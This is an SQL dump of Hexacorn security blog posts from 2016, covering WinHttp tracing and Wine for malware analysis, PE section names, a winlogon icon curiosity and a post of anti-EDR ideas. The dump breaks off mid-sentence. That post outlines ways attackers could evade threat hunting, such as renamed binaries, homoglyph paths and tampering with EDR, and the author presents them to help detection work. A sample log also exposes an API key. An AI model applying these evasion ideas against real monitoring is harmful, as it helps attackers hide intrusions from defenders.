INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (126, 'Permanent Link to Say ‘cyber’ one more time….', 'Hexacorn', 'December 16, 2016 ', '…well, you can try to do so in multiple languages – courtesy of Google Translate – note that some of them are obviously wrong ;):\nAfrikaans: kuber\nAlbanian: cyber\nArabic: الإلكترونية\nArmenian: Cyber\nAzerbaijani: kiber\nBasque: cyber\nBelarusian: кібер\nBengali: সাইবার\nBosnian: cyber\nBulgarian: кибер\nCatalan: cibernètic\nCebuano: cyber\nChichewa: Cyber\nChinese (Simplified): 网络\nChinese (Traditional): 網絡\nChinese: 网络\nCroatian: cyber\nCzech: cyber\nDanish: cyber\nDutch: cyber\nEnglish: cyber\nEsperanto: cyber\nEstonian: cyber\nFilipino: cyber\nFinnish: cyber\nFrench: cyber\nGalician: cibernético\nGeorgian: კიბერ\nGerman: Cyber\nGreek: κυβερνοχώρο\nGujarati: સાયબર\nHaitian Creole: cyber\nHausa: cyber\nHebrew: סייבר\nHindi: साइबर\nHmong: cyber\nHungarian: cyber\nIcelandic: Cyber\nIgbo: cyber\nIndonesian: cyber\nIrish: cíbear\nItalian: informatica\nJapanese: サイバー\nJavanese: cyber\nKannada: ಸೈಬರ್\nKazakh: Cyber\nKhmer: អ៊ិនធើណែ\nKorean: 사이버\nLao: cyber\nLatin: cyber\nLatvian: cyber\nLithuanian: kibernetinio\nMacedonian: сајбер\nMalagasy: tserasera\nMalay: siber\nMalayalam: സൈബർ\nMaltese: ċibernetika\nMaori: ipurangi\nMarathi: सायबर\nMongolian: кибер\nMyanmar (Burmese): ဆိုက်ဘာ\nNepali: साइबर\nNorwegian: cyber\nPersian: سایبری\nPolish: cyber\nPortuguese: Cyber\nPunjabi: ਸਾਈਬਰ\nRomanian: Cyber\nRussian: кибер\nSerbian: сајбер\nSesotho: Cyber\nSinhala: සයිබර්\nSlovak: cyber\nSlovenian: cyber\nSomali: cyber\nSpanish: Cyber\nSundanese: cyber\nSwahili: it\nSwedish: cyber\nTajik: киберҷинояткорӣ\nTamil: இணைய\nTelugu: సైబర్\nThai: ในโลกไซเบอร์\nTurkish: Sibern\nUkrainian: кібер\nUrdu: سائبر\nUzbek: kiber\nVietnamese: cyber\nWelsh: seiber\nYiddish: סייבער\nYoruba: Cyber\nZulu: Cyber\nShare this :)', 'Silly', 'http://www.hexacorn.com/blog/2016/12/16/say-cyber-one-more-time/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (127, 'Permanent Link to Supporting dynamic Malware Analysis with WinHttp library debug logs (tracing)', 'Hexacorn', 'December 15, 2016 ', 'Dynamic Malware Analysis is a tricky business. If you don’t use a dedicated sandbox, or an API monitor, it’s often hard to say what’s going on under the hood. Relying on differential analysis may not be enough and having multiple ways to get more information out of the session is always welcome. Process Monitor, DebugView, Performance/EWT logging, etc. are really handy as a support for black-box analysis, and so it is (or may be) enabling of the NtGlobalFlag. In this post I will describe one more hidden flag that can help to trace what’s going on when malware runs.\nIt turns out that WinHttp library has a built in debugging/tracing mechanism that enables it to log a lot of interesting details and send it either to a file, or directly to a debugger (or both). Lo and behold – it actually has a built-in API monitoring for us! It would be handy if this feature could become an integral part of popular debuggers (or a OllyDbg/Xdbg plug-in).\nTo enable the logging, you can either add the tracing options directly to Registry under the following key:\n\nHKLM\\SOFTWARE\\Microsoft\\Windows\\\nCurrentVersion\\Internet Settings\\WinHttp\\Tracing\n\nf.ex. by using a reg file:\nWindows Registry Editor Version 5.00\r\n\r\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\WinHttp\\Tracing]\r\n\"Enabled\"=dword:00000001\r\n\"LogFilePrefix\"=\"winhttp\"\r\n\"ToFileOrDebugger\"=dword:00000000\r\n\"ShowBytes\"=dword:00000001\r\n\"ShowApiTrace\"=dword:00000001\r\n\"MaxFileSize\"=dword:01312d00\nor use a winhttptracecfg tool which is a part of Windows Server 2003 Resource Kit Tools.\nThe tool is handy, and we can run it like this:\n\nwinhttptracecfg -l winhttp -e 1 -d 0 -s 1 -t 1 -m 20000000\n\nRunning the tool gives us the following output:\n\nThe meaning of the options is as follows:\n\n-e : 1: enable tracing; 0: disable tracing\n-l : [trace-file-prefix], i.e., “C:\\Temp\\Test3”; or simply: “Test3”\n-d : 0: output to file; 1: output to debugger; 2: output to both\n-s : 0: show HTTP headers only; 1: ANSI output; 2: Hex output  (note, this doesn’t seem to work on newer versions of Windows)\n-t : 1: enable top-level API traces; 0: disable top-level API traces\n-m : Maximum size the trace file can grow to\n\nand in our case:\n\n-e 1 –> TracingEnabled: 1  –> enable tracing\n-d 0 –> ToFileOrDebugger: 0 –> save to file only\n-s 1 –> ShowBytes: 1 –> show ANSI output (test on Windows XP)\n-t 1 –> ShowApiTrace: 1  –> enables API monitoring\n-m 20000000 –> MaxFileSize: 20000000 –> file should be large enough\n-l winhttp –> FileNamePrefix: winhttp –> prefix used for a file name\n\nLet’s run a test.\nOne tool that uses WinHttp library is Autoruns. When you launch it with the tracing enabled you should see a log file immediately or almost immediately created f.ex.:\n\nwinhttp-autoruns.exe-4020.22.11.42.035-12.15.2016.LOG\n\nwhere ‘winhttp’ is a prefix we provided in the tracing options, followed by the process name ‘autoruns.exe’, then 4020 which is a PID of the process, then time and date.\nThe example content looks as below, note that:\n\nAPI calls and their parameters are clearly visible\nReturn values are provided\nLots of internal state-related debug info is also provided\n\n(If you don’t see the .log file, check the file / process with VirusTotal)\n22:11:42.035 ::>>>> WinHttp Version 6.0 Build 6.1.7601 >>>>Process autoruns.exe [4020 (0xfb4)] started at 22:11:42.035 12/15/2016\r\n22:11:42.035 ::WinHttpOpen(\"Microsoft-CryptoAPI/6.1\", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY (0), \"\", \"\", 0x0)\r\n22:11:42.035 ::winhttp-dll added a reference to winhttp.dll (via LoadLibrary() call)\r\n22:11:42.035 ::thread-pool created\r\n22:11:42.035 ::thread pool initialized successfully\r\n22:11:42.035 ::_SvcsStartup() succeeded; async-count = 1\r\n22:11:42.035 ::WinHttpOpen() returning handle 0x38fcb98\r\n22:11:42.035 ::WinHttpSetTimeouts(0x38fcb98, 0, 60000, 60000, 60000)\r\n...\r\n22:15:26.005 ::WinHttpOpen() returning handle 0x39ef730\r\n22:15:26.005 ::WinHttpConnect(0x39ef730, \"www.virustotal.com\", 443, 0x0)\r\n22:15:26.005 ::Indicate Status 0x39efad0, 0x0, WINHTTP_CALLBACK_STATUS_HANDLE_CREATED (1024), 0x12edd4 [0x39efad0], 4\r\n22:15:26.005 ::WinHttpConnect() returning handle 0x39efad0\r\n22:15:27.066 ::WinHttpOpenRequest(0x39efad0, \"POST\", \"/partners/sysinternals/file-reports?apikey=4e3202fdbe953d628f650229af5b3eb49cd46\", \"\", \"\", 0x0, 0x00800000)\r\n22:15:27.066 ::Indicate Status 0x395ebe8, 0x0, WINHTTP_CALLBACK_STATUS_HANDLE_CREATED (1024), 0x2cefc84 [0x395ebe8], 4\r\n22:15:27.066 ::WinHttpCreateUrl(0x2cefc20, 0x0, 0x0, 0x2cefc70)\r\n22:15:27.066 ::    WinHttpCreateUrl(); URL = (null), URL Length = 0\r\n22:15:27.066 ::    WinHttpCreateUrl: error 122 [ERROR_INSUFFICIENT_BUFFER]\r\n22:15:27.066 ::WinHttpCreateUrl() returning FALSE\r\n22:15:27.066 ::WinHttpCreateUrl(0x2cefc20, 0x0, 0x2af5b8, 0x2cefc70)\r\n22:15:27.066 ::    WinHttpCreateUrl(); URL = https://www.virustotal.com/partners/sysinternals/file-reports?apikey=4e3202fdbe9, URL Length = 133\r\n22:15:27.066 ::WinHttpCreateUrl() returning TRUE\r\n22:15:27.066 ::WinHttpOpenRequest() returning handle 0x395ebe8\r\n22:15:27.066 ::WinHttpGetProxyForUrl(0x39ef730, \"https://www.virustotal.com\", 0x2cefd9c, 0x2cefdb4)\nOn XP, the ShowBytes enables inclusions of the additional data dumps for headers f.ex.:\n11:51:55.106 ::*0000001* :: sending data:\r\n11:51:55.106 ::*0000001* :: 177 (0xb1) bytes\r\n11:51:55.106 ::*0000001* :: <<<<-------- HTTP stream follows below ----------------------------------------------->>>>\r\n11:51:55.106 ::*0000001* :: GET /wpad.dat HTTP/1.1\r\n11:51:55.106 ::*0000001* :: Accept: */*\r\n11:51:55.106 ::*0000001* :: User-Agent: Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; .NET5.0C; .NET5.0E)\r\n11:51:55.106 ::*0000001* :: Host: 127.0.0.1\r\n11:51:55.106 ::*0000001* :: Connection: Keep-Alive\r\n11:51:55.122 ::*0000001* :: \r\n11:51:55.122 ::*0000001* :: \r\n11:51:55.122 ::*0000001* :: <<<<-------- End ----------------------------------------------->>>>\r\n11:51:55.122 ::*0000001* :: WinHttpSendRequest() returning TRUE\r\n11:51:55.122 ::*0000001* :: WinHttpReceiveResponse(0xaf2000, 0x0)\r\n11:51:55.122 ::*0000001* :: received data:\r\n11:51:55.122 ::*0000001* :: 67 (0x43) bytes\r\n11:51:55.122 ::*0000001* :: <<<<-------- HTTP stream follows below ----------------------------------------------->>>>\r\n11:51:55.122 ::*0000001* :: HTTP/1.1 200 OK\r\n11:51:55.122 ::*0000001* :: Content-Length: 59745\r\n11:51:55.122 ::*0000001* :: Content-Type: text/html\r\n11:51:55.122 ::*0000001* :: \r\n11:51:55.122 ::*0000001* :: \r\n11:51:55.122 ::*0000001* :: <<<<-------- End ----------------------------------------------->>>>\nShare this :)', 'Malware Analysis', 'http://www.hexacorn.com/blog/2016/12/15/supporting-dynamic-malware-analysis-with-winhttp-library-debug-logs-tracing/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (128, 'Permanent Link to PE Section names – re-visited', 'Hexacorn', 'December 15, 2016 ', 'Update 2018-06-02\nAdded .apiset\nUpdate 2017-11-21\nUpdated info on minATL and .wpp_sf\nthx to @digirati82 for bringing it to my attention\nUpdate: This list has been last updated on 7th of January 2017\n4 years back I published a list of PE section names; I recently thought of revisiting the list and as a result added a lot more entries.\nThis is the latest version of the list (note that there are duplicates, if treated as case-insensitive):\nThe packer/protector/tools section names/keywords\n\n.aspack – Aspack packer\n.adata – Aspack packer/Armadillo packer\nASPack – Aspack packer\n.ASPack – ASPAck Protector\n.boom – The Boomerang List Builder (config+exe xored with a single byte key 0x77)\n.ccg – CCG Packer (Chinese Packer)\n.charmve – Added by the PIN tool\nBitArts – Crunch 2.0 Packer\nDAStub – DAStub Dragon Armor protector\n!EPack – Epack packer\nFSG! – FSG packer (not a section name, but a good identifier)\n.gentee – Gentee installer\nkkrunchy – kkrunchy Packer\n.mackt – ImpRec-created section\n.MaskPE – MaskPE Packer\nMEW – MEW packer\n.MPRESS1 – Mpress Packer\n.MPRESS2 – Mpress Packer\n.neolite – Neolite Packer\n.neolit – Neolite Packer\n.nsp1 – NsPack packer\n.nsp0 – NsPack packer\n.nsp2 – NsPack packer\nnsp1 – NsPack packer\nnsp0 – NsPack packer\nnsp2 – NsPack packer\n.packed – RLPack Packer (first section)\npebundle – PEBundle Packer\nPEBundle – PEBundle Packer\nPEC2TO – PECompact packer\nPECompact2 – PECompact packer (not a section name, but a good identifier)\nPEC2 – PECompact packer\npec1 – PECompact packer\npec2 – PECompact packer\nPEC2MO – PECompact packer\nPELOCKnt – PELock Protector\n.perplex – Perplex PE-Protector\nPESHiELD – PEShield Packer\n.petite – Petite Packer\n.pinclie – Added by the PIN tool\nProCrypt – ProCrypt Packer\n.RLPack – RLPack Packer (second section)\n.rmnet – Ramnit virus marker\nRCryptor – RPCrypt Packer\n.RPCrypt – RPCrypt Packer\n.seau – SeauSFX Packer\n.sforce3 – StarForce Protection\n.spack – Simple Pack (by bagie)\n.svkp – SVKP packer\nThemida – Themida Packer\n.Themida – Themida Packer\n.taz – Some version os PESpin\n.tsuarch – TSULoader\n.tsustub – TSULoader\n.packed – Unknown Packer\nPEPACK!! – Pepack\n.Upack – Upack packer\n.ByDwing – Upack Packer\nUPX0 – UPX packer\nUPX1 – UPX packer\nUPX2 – UPX packer\nUPX! – UPX packer\n.UPX0 – UPX Packer\n.UPX1 – UPX Packer\n.UPX2 – UPX Packer\n.vmp0 – VMProtect packer\n.vmp1 – VMProtect packer\n.vmp2 – VMProtect packer\nVProtect – Vprotect Packer\n.winapi – Added by API Override tool\nWinLicen – WinLicense (Themida) Protector\n_winzip_ – WinZip Self-Extractor\n.WWPACK – WWPACK Packer\n.yP – Y0da Protector\n.y0da – Y0da Protector\n\nList of popular section names\n\n.00cfg – Control Flow Guard (CFG) section (added by newer versions of Visual Studio)\n.apiset – a section present inside the apisetschema.dll\n.arch – Alpha-architecture section\n.autoload_text – cygwin/gcc; the Cygwin DLL uses a section to avoid copying certain data on fork.\n.bindat – Binary data (also used by one of the downware installers based on LUA)\n.bootdat – section that can be found inside Visual Studio files; contains palette entries\n.bss – Uninitialized Data Section\n.BSS – Uninitialized Data Section\n.buildid – gcc/cygwin; Contains debug information (if overlaps with debug directory)\n.CLR_UEF – .CLR Unhandled Exception Handler section; see https://github.com/dotnet/coreclr/blob/master/src/vm/excep.h\n.code – Code Section\n.cormeta – .CLR Metadata Section\n.complua – Binary data, most likely compiled LUA (also used by one of the downware installers based on LUA)\n.CRT – Initialized Data Section  (C RunTime)\n.cygwin_dll_common – cygwin section containing flags representing Cygwin’s capabilities; refer to cygwin.sc and wincap.cc inside Cygwin run-time\n.data – Data Section\n.DATA – Data Section\n.data1 – Data Section\n.data2 – Data Section\n.data3 – Data Section\n.debug – Debug info Section\n.debug$F – Debug info Section (Visual C++ version <7.0)\n.debug$P – Debug info Section (Visual C++ debug information – precompiled information\n.debug$S – Debug info Section (Visual C++ debug information – symbolic information)\n.debug$T – Debug info Section (Visual C++ debug information – type information)\n.drectve  – directive section (temporary, linker removes it after processing it; should not appear in a final PE image)\n.didat – Delay Import Section\n.didata – Delay Import Section\n.edata – Export Data Section\n.eh_fram – gcc/cygwin; Exception Handler Frame section\n.export – Alternative Export Data Section\n.fasm – FASM flat Section\n.flat – FASM flat Section\n.gfids – section added by new Visual Studio (14.0); purpose unknown\n.giats – section added by new Visual Studio (14.0); purpose unknown\n.gljmp – section added by new Visual Studio (14.0); purpose unknown\n.glue_7t – ARMv7 core glue functions (thumb mode)\n.glue_7 – ARMv7 core glue functions (32-bit ARM mode)\n.idata – Initialized Data Section  (Borland)\n.idlsym – IDL Attributes (registered SEH)\n.impdata – Alternative Import data section\n.itext – Code Section  (Borland)\n.ndata – Nullsoft Installer section\n.orpc – Code section inside rpcrt4.dll\n.pdata – Exception Handling Functions Section (PDATA records)\n.rdata – Read-only initialized Data Section  (MS and Borland)\n.reloc – Relocations Section\n.rodata – Read-only Data Section\n.rsrc – Resource section\n.sbss – GP-relative Uninitialized Data Section\n.script – Section containing script\n.shared – Shared section\n.sdata – GP-relative Initialized Data Section\n.srdata – GP-relative Read-only Data Section\n.stab – Created by Haskell compiler (GHC)\n.stabstr – Created by Haskell compiler (GHC)\n.sxdata – Registered Exception Handlers Section\n.text – Code Section\n.text0 – Alternative Code Section\n.text1 – Alternative Code Section\n.text2 – Alternative Code Section\n.text3 – Alternative Code Section\n.textbss – Section used by incremental linking\n.tls – Thread Local Storage Section\n.tls$ – Thread Local Storage Section\n.udata – Uninitialized Data Section\n.vsdata – GP-relative Initialized Data\n.xdata – Exception Information Section\n.wixburn – Wix section; see https://github.com/wixtoolset/wix3/blob/develop/src/burn/stub/StubSection.cpp\n.wpp_sf  – section that is most likely related to WPP (Windows software trace PreProcessor); not sure how it is used though; the code inside the section is just a bunch of routines that call FastWppTraceMessage that in turn calls EtwTraceMessage\nBSS – Uninitialized Data Section  (Borland)\nCODE – Code Section (Borland)\nDATA – Data Section (Borland)\nDGROUP – Legacy data group section\nedata – Export Data Section\nidata – Initialized Data Section  (C RunTime)\nINIT – INIT section (drivers)\nminATL – Section that can be found inside some ARM PE files; purpose unknown; .exe files on Windows 10 also include this section as well; its purpose is unknown, but it contains references to ___pobjectentryfirst,___pobjectentrymid,___pobjectentrylast pointers used by Microsoft::WRL::Details::ModuleBase::… methods described e.g. here, and also referenced by .pdb symbols; so, looks like it is being used internally by Windows Runtime C++ Template Library (WRL) which is a successor of Active Template Library (ATL); further research needed\nPAGE – PAGE section (drivers)\nrdata – Read-only Data Section\nsdata – Initialized Data Section\nshared – Shared section\nShared – Shared section\ntestdata – section containing test data (can be found inside Visual Studio files)\ntext – Alternative Code Section\n\nOther section names\n\n.text$<name> – Typically a temporary Code Section merged during building; <name> can be anything; the sections are sorted by name, and combined into a single .text section during the linking process\n.data$<name> – as above, for .data section\n.rdata$<name> – as above, for .rdata section\n.rsrc$<name> – as above, for .rsrc section\n/<number> – often found in Windows clones of *nix tools compiled with mingw/cygwin; these typically replace lengthy section names that are used under *nix; the compiler often preserves the section names in the debugging information (which is often attached to the file); most of PE dumpers can’t process the debug information and just shows the raw numeric section names; tools like IDA can process this information and shows us the real section names (f.ex. .autoload_text, .cygwin_dll_common);  examples below:\n\n/4\n/14\n/19\n/29\n/41\n/48\n/55\n/67\n/78\n/89\n\n\nRelated to the above, the sections used by mingw/cygwin are listed below (they can be found inside the cygwin.sc file in the source tarball).\n\n.init\n.text\n.text$* (basically, .text$<name>)\n.glue_7t\n.glue_7\n.fini\n.gcc_exc\n.gcc_except_table\n.autoload_text\n.data\n.data2\n.data$* (basically, .data$<name>)\n.data_cygwin_nocopy\n.rdata\n.rdata$* (basically, .rdata$<name>)\n.eh_frame\n.pdata\n.bss\nCOMMON\n.edata\n.debug$S\n.debug$T\n.debug$F\n.drectve\n.idata\n.idata$2\n.idata$3\n.idata$4\n.idata$5\n.idata$6\n.idata$7\n.CRT\n.endjunk\n.cygwin_dll_common\n.rsrc\n.rsrc$* (basically, .rsrc$<name>)\n.reloc\n.stab\n.stabstr\n.debug_aranges\n.debug_pubnames\n.debug_info\n.debug_abbrev\n.debug_line\n.debug_frame\n.debug_str\n.debug_loc\n.debug_macinfo\n.debug_ranges\n.cygheap\n\n\n\nShare this :)', 'Batch Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2016/12/15/pe-section-names-re-visited/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (129, 'Permanent Link to Malware analysis using Wine', 'Hexacorn', 'December 14, 2016 ', 'Wine is a free implementation of Windows on Unix. That’s what the Wine web site says. To a malware analyst though, Wine is a free analysis platform that can be leveraged to analyze Windows executables.\nHow so?\nIt’s all thanks to the various so-called debug channels that Wine offers. Some of these channels – when enabled – turn Wine into a fully-blown tracer, an API monitor, or a complete log madness that includes any possible messages from Wine.\nI won’t cover here how to install Wine, but you should easily find a recipe online. Once installed, it’s ready for a few quick tests that will demonstrate its main monitoring features (from the malware analysts’ perspective):\n\nShowing a list of loaded/unloaded modules (during run-time)\n\n\nWINEDEBUG=+loaddll wine /mnt/<path>/notepad.exe\n\n\n\nShowing list of API calls and their return values\n\n\nWINEDEBUG=+relay wine /mnt/<path>/notepad.exe\n\n\n\nAbsolute tracing madness (yet still meaningful)\n\n\nWINEDEBUG=+all wine /mnt/<path>/notepad.exe\n\n\n\n\nA number of channels can be combined, f.ex. one can run the following command:\n\n\nWINEDEBUG=+relay,+tid,+timestamp\n\n\nto prepend the API log with a timestamp, and the TID (thread ID) of the current thread executing the API inside the process:\n202729.726:0024:Call ntdll.RtlAllocateHeap(00110000,00000000,00000020) ret=7ed13224\r\n202729.726:0024:Ret  ntdll.RtlAllocateHeap() retval=00118ac8 ret=7ed13224\r\n202729.726:0024:Ret  rpcrt4.I_RpcGetBuffer() retval=00000000 ret=7ed57c45\r\n202729.726:0024:Call rpcrt4.NdrServerContextNewMarshall(00b4e718,00119078,7ed55770,7ed612a4) ret=7ed57c81\r\n202729.726:0024:Call ntdll.RtlFreeHeap(00110000,00000000,00118fc0) ret=7ed14071\r\n202729.726:0024:Ret  ntdll.RtlFreeHeap() retval=00000001 ret=7ed14071\r\n202729.726:0024:Call ntdll.RtlReleaseResource(0011909c) ret=7ecfc83c\r\n202729.726:0024:Ret  ntdll.RtlReleaseResource() retval=00000000 ret=7ecfc83c\r\n202729.726:0024:Call ntdll.RtlDeleteResource(0011909c) ret=7ecfb4a7\r\n202729.726:0024:Ret  ntdll.RtlDeleteResource() retval=00000000 ret=7ecfb4a7\r\n202729.726:0024:Call ntdll.RtlFreeHeap(00110000,00000000,00119078) ret=7ecfb4bb\r\n202729.726:0024:Ret  ntdll.RtlFreeHeap() retval=00000001 ret=7ecfb4bb\r\n202729.726:0024:Ret  rpcrt4.NdrServerContextNewMarshall() retval=001166a8 ret=7ed57c81\r\n202729.726:0024:Call ntdll.RtlAllocateHeap(00110000,00000008,00000018) ret=7ed03c9c\r\n202729.726:0024:Ret  ntdll.RtlAllocateHeap() retval=00118c20 ret=7ed03c9c\r\n202729.726:0024:Call ntdll.RtlAllocateHeap(00110000,00000008,00000030) ret=7ed04c44\r\n202729.731:0024:Ret  ntdll.RtlAllocateHeap() retval=00118fc0 ret=7ed04c44\r\n202729.731:0024:Call KERNEL32.WriteFile(00000024,00118fc0,00000030,00b4e748,00000000) ret=7ed0cc8f\r\n202729.731:0018:Ret  KERNEL32.ReadFile() retval=00000001 ret=7ec72d02\r\n202729.731:0018:Call ntdll.RtlAllocateHeap(00110000,00000000,00000018) ret=7ec6be06\r\n202729.731:0018:Ret  ntdll.RtlAllocateHeap() retval=0011b888 ret=7ec6be06\nA few notes at the end:\n\nWine supports both 64- and 32- Portable Executables\nThere are 400+ different channels; I will lie if I say that I know what all of them trace\nObviously, running executables under Wine is a subject to various sandbox detections, including these I described in the past.\nThe analysis could be automated to produce a decent sandbox report; while it can’t compete with commercial sandboxes, it may be a a decent solution for in-house analysis, especially for small companies (and as an alternative, complementary sandbox)\nIf combined with other free solutions, may provide a secondary sandbox for differential analysis i.e. certain artifacts could be compared between 2 sessions (f.ex. one in cuckoo and one in Wine) and help in highlighting ‘randomness’ of some artifacts f.ex. mutex names, files created, etc.\nSince it is running natively on Linux, lots of tools are available out of the box that may help in scripting and data processing\nThe source code is available and you can modify it to your purposes (f.ex. add automatic yara rule generation for specific artifacts, automatic URL extraction, etc.)\nLast, but not least – it won’t work with some executables – it still has bugs & features that are not implemented yet\n\nAll in all, yet another tool that may sometimes come handy.\nShare this :)', 'Malware Analysis, Sandboxing', 'http://www.hexacorn.com/blog/2016/12/14/malware-analysis-using-wine/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (130, 'Permanent Link to A few ideas to mess around with threat hunting, and EDR software (anti-threat hunt', 'Hexacorn', 'December 12, 2016 ', 'I just came back from holidays and since time off it’s usually a great time to make your brain run idle, it often turns it into a bit more creative device than usual. As a result I came up with a number of ideas that I will post about in the coming days. I’ll kick it off by discussing the anti-threat hunting/anti-edr techniques.\nI do threat hunting for living, so it’s not just a post to play a devil’s advocate, but an invitation to discuss ways of detecting techniques I am going to present below (and potentially others).\nTo stay focused, I’ll mainly talk about the process creation events that can be typically analyzed inside Splunk (or other log aggregator) that is collecting Windows Event logs (f.ex. Security events with the Event ID 4688) and data from a typical EDR software (this includes sysmon). The discussion can be extended to other events quite easily.\nOkay, so let’s assume that we have a nice collection of events showing us all the process names (and possibly command line options) from the systems and we already created rules for detecting some anomalies + we regularly review the alerts and new event logs to see if there is any new anomaly that we can potentially spot by just eyeballing data and codify into a new alert/watchlist. A clever attacker could attempt to modify our logs in a way that could affect these automated detections & analysis by attempting to hide the execution of some processes, or if lucky (I have not tested it), perhaps even hide some of the logs from the analyst.\nHere’s how it could work:\n\nMany watchlists focus on process names; changing a process name turns the watchlist useless (f.ex. macro could copy ‘powershell.exe’ to ‘harmless.exe’ before executing the powershell snippet, or ‘cscript.exe’ to ‘goodprogram.exe’); try it, it actually works and since the copy operation can be delivered via API, it may be hard to spot it by just looking at process logs; to detect it we would need to look at the flow of both process creation events and preceding it file system operations\nLots of analysis happen on Web UI level; if the EDR or Event Viewer doesn’t process the HTML entities correctly, there is a possibility of injecting tags modifying the flow of the generated HTML; I have not tested it, but it’s a possibility\nPossibly a silly idea, but EDR has to store data somewhere and it probably uses some database; would a carefully crafted path or a file name cause an SQL command to fail? [similar to SQL injection; could we delete all records by doing SQL injection using a specially crafted event?]\nThere are potential bugs in EDR that can be exploited\nHomomorphic object names f.ex. paths, and file names (using two identically looking Unicode characters with one non-English replacing opcodes for English characters) may make the analyst ‘blind’; if the attacker creates ‘c:\\Windоws\\system32\\calc.exe’ and ‘o’ in ‘Windows’ is a Cyrillic ‘о’, the paths will look identical and casual eyeballing of the data will miss this entry classifying it as a legitimate ‘c:\\Windows\\system32\\calc.exe’; this can be detected using data stacking, and by showing the non-standard English characters (especially these that can be used for homomorphic paths) using their Unicode code in an escaped form (or using a different color at least).\nDelays are a trouble to sandboxes. The very same is true for EDR; if the events are generated slowly, it may be hard to correlate them + they will be interleaved by a large number of other, legitimate events; unfortunately, even basic event logs are quite noisy (load module, create open file/registry, etc. – lots of it comes from legitimate OS libraries; perhaps filtering of white-listed events is required)\nDirect attack on EDR could prevent event interception; this is not bugs per se, but understanding how the software operates may help to bypass it:\n\nIf the EDR doesn’t work from kernel/hypervisor level, one could modify access rights to the malicious files so they can’t be accessed; same goes for directories, registry\nIf the EDR doesn’t protect its services, processes, registry keys, files from tampering, this could help to kill its functionality (same techniques as for AV)\nEvasions could be built-in for specific EDR that bad guys don’t know how to bypass (EDR detection working the same way as sandbox / vm detection)\nFinally, knowing the network protocol, one could potentially install a filter (or simply patch the code in memory) that would disable the event reporting that is related to malicious activity (EDR events going via malicious proxy!)\n\n\nUsing new hacking tricks may help to bypass EDR as well (good to follow the trends in pentesting world)\nIf the system is a web server, it may be hard to spot activities on the system if delivered via a web shell that talks directly to API\nAlso, lots can be done from ntdll alone and it’s resident in every process; and while using NT call, or even syscalls directly is trickier, it could bypass some of the user-mode EDR engines as well; in other words – spawning new processes is a lazy way malware does it today, but it may change in the future\nand so on, and so forth…\n\nShare this :)', 'Anti-*, Anti-Forensics, EDR, Incident Response', 'http://www.hexacorn.com/blog/2016/12/12/a-few-ideas-to-mess-around-with-threat-hunting-and-edr-software-anti-threat-huntinganti-edr/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (131, 'Permanent Link to The Archaeologologogology #2 – the romantic view as seen through the winlogon.exe’', 'Hexacorn', 'November 27, 2016 ', 'Every once in a while people report that they suspect their systems to be infected. This is because they discover their winlogon.exe uses a very unusual, and definitely suspicious icon – the one with a the Moon, and the stars:\nYou won’t see this on Windows 8 or 10 anymore, but if you look at the resources of winlogon.exe you can still find the icon there:\nLooking for the code referring to ID 14 inside the Windows 10 winlogon.exe doesn’t show any immediate results. We can try to do the same with winlogon.exe from Windows 7 – one of the OSs on which the icon is still visible directly in the Windows Explorer pane. I couldn’t find the code either, but I noted that this time the icon was listed under a different ID (notably, Windows XP lists it under the very same ID):\nFirst, let’s try to explain why the icon is no longer visible inside the Windows Explorer on Windows 10&8.\nWhen Explorer chooses the icon to show for a given executable it enumerates the resources inside the file and searches for the first one that is defined as RT_GROUP_ICON (which is a bit like a set of icons – the good ol’ Resource Hacker shows it under the “Icon Group” branch). As a side note, the most typical way RT_GROUP_ICON lists are defined makes the very first icon we see on the list of icons inside Resource Hacker the one that is used by Windows Explorer.\nLet’s have a look at the winlogon.exe icon groups from Windows 7.\nThe first one is ‘IDD_APPLICAITON_ICO’.\n(As a side note, you have probably noticed the typo i.e. ‘applicaiton’ vs. ‘application’ in the ‘IDD_APPLICAITON_ICO’ ID name. It is actually quite an important mistake and I will explain why later on)\nOn Windows 7 it is slightly different:\nRight, so it’s ‘IDD_SHUTDOWN_BITMAP’, and the only icon in this set is… the Moon&the stars.\nGoing a bit further back, the Windows XP doesn’t use the name, but the number 4:\nSo, we see the icon on Windows XP and 7, because it’s the very first RT_GROUP_ICON listed.\nOne mystery solved.\nLet’s come back to the resource names we came across inside winlogon.exe from Windows 10. The name of the ‘IDD_SHUTDOWN_BITMAP’ may look familiar – if you take another look at that window (see below) you will notice that the developers inserted ‘IDD_APPLICAITON_ICO’ right above the ‘IDD_SHUTDOWN_BITMAP’ group – we can also confirm the latter is the very same icon group as in Windows 7 and on Windows XP:\nSo, it’s obviously a cosmetic change intended to replace the romantic icon with a boring default application image in the newer versions of Windows.\nIf we take yet another look at the Icon Groups above, there is one more detail that is quite striking. There are 2 groups that use names (prefix ‘IDD_’) and 2 that use numbers.\nWas it intentional?\nI don’t think so.\nThe way Resource compiler works is that when the resource files (files with the extension .rc /which I believe are still used to build the ‘old’ executables even on Windows 10/) are compiled, the parser is looking for definitions of resource IDs which other resources may later refer to. Typical way to use the ID names is by using the approach shown below.\nInside the header file (resource.h) you write something along these lines:\n#define IDD_SHUTDOWN_BITMAP 4\nand later, you can refer to this resource by using the defined name (inside the .rc file):\nIDD_SHUTDOWN_BITMAP ICON \"moonstars.ico\"\nThe funny side-effect (a bug/feature?) of the resource compiler is that it does not complain when it comes across a resource name that has not been defined earlier. In such cases it will blindly assume that it is… a string (a text). The root cause for this is that resource ID can be both numbers, and strings, so the arbitrary decision by the Resource Compiler to treat all unknown resource names as strings creates situations we see demonstrated on the above screenshots. Note that I intentionally chose to define IDD_SHUTDOWN_BITMAP as 4 (#define IDD_SHUTDOWN_BITMAP 4) to bring your attention to the difference between Windows XP (Icon group is number 4) and Windows 7 (icon group is a textual name 